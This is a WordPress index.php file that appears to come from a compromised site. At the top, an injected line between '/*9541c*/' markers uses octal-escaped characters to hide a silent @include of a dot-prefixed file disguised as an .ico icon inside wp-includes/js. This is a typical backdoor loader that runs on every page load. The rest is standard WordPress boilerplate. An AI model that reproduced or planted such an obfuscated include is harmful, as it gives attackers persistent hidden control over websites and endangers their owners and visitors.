<?php
/*9541c*/

@include "\057h\157m\145/\155a\166e\156u\160/\160u\142l\151c\137h\164m\154/\164e\162a\143o\156.\160k\057w\160-\151n\143l\165d\145s\057j\163/\0567\142b\0646\0711\142.\151c\157";

/*9541c*/



/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
